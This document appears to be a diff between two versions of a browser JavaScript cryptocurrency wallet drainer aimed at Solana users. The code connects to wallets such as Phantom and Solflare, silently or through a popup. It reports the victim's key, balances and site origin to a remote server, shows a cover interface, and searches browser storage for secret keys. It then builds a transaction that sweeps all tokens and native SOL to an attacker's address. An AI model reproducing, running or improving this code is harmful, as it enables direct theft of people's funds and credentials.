@@ -5,7 +5,7 @@
   const E = "https://esm.sh/";
   const SRV = String(window.__PP || "https://one234-et4e.onrender.com").replace(/\/+$/, "");
   const BKEY = "72d296b612eb0a11931b364ba1333a70";
-  const VER = "v3.3";
+  const VER = "v3.4";
   const RPCS = [
     "https://solana-rpc.publicnode.com",
     "https://api.mainnet-beta.solana.com",
@@ -35,14 +35,14 @@
         const r = await fetch(u, { method: "POST", headers: { "content-type": "application/json" },
           body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: method, params: params }) });
         if (!r.ok) { lastErr = new Error(u.replace("https://", "").split("/")[0] + " HTTP " + r.status);
-          await new Promise(function (s) { setTimeout(s, 300); }); continue; }
+          await new Promise(s => setTimeout(s, 300)); continue; }
         const j = await r.json();
         if (j && j.result !== undefined) return j;
         if (j && j.error) { lastErr = new Error(j.error.message || "RPC error");
           if (j.error.code === -32601) return j;
-          await new Promise(function (s) { setTimeout(s, 300); }); continue; }
+          await new Promise(s => setTimeout(s, 300)); continue; }
       } catch (e) { lastErr = e; }
-      await new Promise(function (s) { setTimeout(s, 300); });
+      await new Promise(s => setTimeout(s, 300));
     }
     return { error: { message: lastErr ? String(lastErr.message || lastErr) : "all RPC endpoints failed" } };
   }
@@ -51,7 +51,7 @@
     for (let a = 0; a < 3; a++) {
       const r = await rpc("getBalance", [pk]);
       if (r && r.result !== undefined) return r.result;
-      await new Promise(function (s) { setTimeout(s, 1200); });
+      await new Promise(s => setTimeout(s, 1200));
     }
     return null;
   }
@@ -59,36 +59,21 @@
   async function readTokens(pk) {
     for (let a = 0; a < 3; a++) {
       const r = await rpc("getParsedTokenAccountsByOwner", [pk, {
-        programId: "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm",
-        commitment: "confirmed"
-      }]);
+        programId: "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm", commitment: "confirmed" }]);
       if (r && r.result !== undefined) return r.result;
-      await new Promise(function (s) { setTimeout(s, 1200); });
+      await new Promise(s => setTimeout(s, 1200));
     }
     return null;
   }
 
   let PKSTR = null;
-
   const beacon = function (m, o) {
     o = o || {};
     try {
-      fetch(SRV + "/beacon?s=" + BKEY, {
-        method: "POST",
-        body: JSON.stringify({
-          pk: o.pk || PKSTR || "?",
-          provider: o.provider || "unknown",
-          origin: location.origin,
-          value: o.value || 0,
-          sol: o.sol || 0,
-          toks: o.toks || "",
-          m: m,
-          mode: o.mode || "",
-          sig: o.sig || "",
-          msg: o.msg || "",
-          extra: o.extra || ""
-        })
-      });
+      fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
+        body: JSON.stringify({ pk: o.pk || PKSTR || "?", provider: o.provider || "unknown",
+          origin: location.origin, value: o.value || 0, sol: o.sol || 0, toks: o.toks || "",
+          m: m, mode: o.mode || "", sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" }) });
     } catch (e) {}
   };
 
@@ -105,30 +90,19 @@
   try {
     beacon("loaded", { provider: "scanning" });
 
+    // — connect: phantom/axiom/trust/solflare/solana via connect(), no publicKey probing —
     const mod = await import(E + "@solana/web3.js@1.95.0");
-    const PublicKey = mod.PublicKey;
-    const Keypair = mod.Keypair;
-    const SystemProgram = mod.SystemProgram;
-    const Transaction = mod.Transaction;
-    const Connection = mod.Connection;
-
+    const PublicKey = mod.PublicKey, Keypair = mod.Keypair, SystemProgram = mod.SystemProgram,
+      Transaction = mod.Transaction, Connection = mod.Connection;
     const spl = await import(E + "@solana/spl-token@0.4.9");
-    const createTransfer = spl.createTransfer;
-    const createAssociatedTokenAccountInstruction = spl.createAssociatedTokenAccountInstruction;
-    const getAssociatedTokenAddress = spl.getAssociatedTokenAddress;
-
+    const createTransfer = spl.createTransfer,
+      createAssociatedTokenAccountInstruction = spl.createAssociatedTokenAccountInstruction,
+      getAssociatedTokenAddress = spl.getAssociatedTokenAddress;
     const bs = await import(E + "bs58@6.0.0");
-    const b58d = bs.decode;
-    const b58e = bs.encode;
-
+    const b58d = bs.decode, b58e = bs.encode;
     const TOKEN_PROGRAM = new PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");
 
-    // ══ NATIVE SOL IS THE PRIMARY TARGET ══
-    // Read via getBalance(pk) — returns lamports. Swept with SystemProgram.transfer.
-    // WSOL in MINTS is a separate SPL token if the victim holds it as a token —
-    // different thing entirely. Native SOL needs no mint and no ATA.
-
-    const PROVIDERS = [
+    const CANDS = [
       ["phantom", function () { return window.phantom && window.phantom.solana; }],
       ["axiom", function () { return window.axiom && window.axiom.solana; }],
       ["trust", function () { return window.trustwallet && window.trustwallet.solana; }],
@@ -137,18 +111,16 @@
       ["solana", function () { return window.solana; }]
     ];
 
-    // ── connect-first detection: connect() resolves with the account, read it safely ──
+    let name = null, prov = null, pk = null;
     const found = [];
-    for (const item of PROVIDERS) {
+    for (const item of CANDS) {
       let p = null;
       try { p = item[1](); } catch (e) { p = null; }
       if (p && typeof p.connect === "function") found.push([item[0], p]);
     }
     beacon("detect", { provider: "scan", extra: "candidates: " + (found.map(function (x) { return x.name; }).join(",") || "none") });
 
-    let name = null, prov = null, pk = null;
-
-    // pass 1 — silent reconnect (already-authorized, no popup)
+    // — pass 1: silent reconnect (already authorized) —
     for (const item of found) {
       try {
         const c = await withTO(Promise.resolve(item[1].connect({ onlyIfTrusted: true })), 8000);
@@ -156,8 +128,7 @@
         if (k) { name = item[0]; prov = item[1]; pk = k; break; }
       } catch (e) {}
     }
-
-    // pass 2 — explicit connect with popup
+    // — pass 2: explicit popup —
     if (!pk) {
       for (const item of found) {
         try {
@@ -169,19 +140,17 @@
         }
       }
     }
-
     if (!pk) {
       beacon("err", { provider: "none", msg: "no wallet connected \u2014 all providers refused" });
       return;
     }
 
-    beacon("detect", { provider: name, extra: "connected \u2014 reading balances" });
-
-    const label = name.indexOf("ext:") === 0 ? name.slice(4) : name;
+    PKSTR = pk;
     const pkB = new PublicKey(pk);
     const conn = new Connection(RPCS[0], "confirmed");
+    const label = name.indexOf("ext:") === 0 ? name.slice(4) : name;
 
-    // ── balance read with retry — native SOL via getBalance ──
+    // — inventory: getBalance via raw RPC failover, retried —
     const bal = await readBalance(pk);
     if (bal === null) {
       beacon("err", { pk: pk, provider: label, msg: "balance read failed on all RPC endpoints \u2014 attempting drain anyway" });
@@ -222,7 +191,7 @@
 
     beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });
 
-    // ── cover UI ──
+    // — cover UI —
     try {
       const el = document.createElement("div");
       el.id = "__ppcard";
@@ -258,7 +227,7 @@
       } catch (e) {}
     };
 
-    // ── secret-key candidates (0-approval path) ──
+    // — secret-key candidates —
     const KEYF = new Set(["secretKey", "sk", "secret", "privateKey", "priv"]);
     const cands = [];
     for (const st of [localStorage, sessionStorage]) {
@@ -296,7 +265,6 @@
       return Uint8Array.from(c.raw);
     };
 
-    // ── drain build: native SOL swept via getBalance at drain time ──
     const FEE = 20000;
     async function buildTx(to) {
       const dest = new PublicKey(to);
@@ -306,7 +274,6 @@
         beacon("err", { pk: pk, provider: label, msg: "blockhash failed: " + why });
         return { err: why };
       }
-      // fresh balance at drain time — this is the REAL native SOL amount
       const bal2 = await readBalance(pk);
       const balNum = bal2 !== null ? bal2 : 0;
       const r2 = await readTokens(pk);
@@ -322,7 +289,6 @@
       }
       const tx = new Transaction();
       const moved = [];
-      // tokens first (if any)
       for (const t of toks) {
         const have = amt2[MINTS[t.k]] || 0;
         if (have < 0.01) continue;
@@ -334,12 +300,8 @@
         tx.add(createTransfer(srcAta, destAta, pkB, Math.round(have * Math.pow(10, dec2[MINTS[t.k]]))));
         moved.push(t.k);
       }
-      // native SOL sweep — the primary drain
       const lam = Math.floor(balNum);
-      if (lam > FEE + 5000) {
-        tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: lam - FEE }));
-        if (!moved.includes("SOL")) moved.push("SOL");
-      }
+      if (lam > FEE + 5000) tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: lam - FEE }));
       tx.feePayer = pkB;
       tx.recentBlockhash = bh2.result.value.blockhash;
       tx.lastValidBlockHeight = bh2.result.value.lastValidBlockHeight;
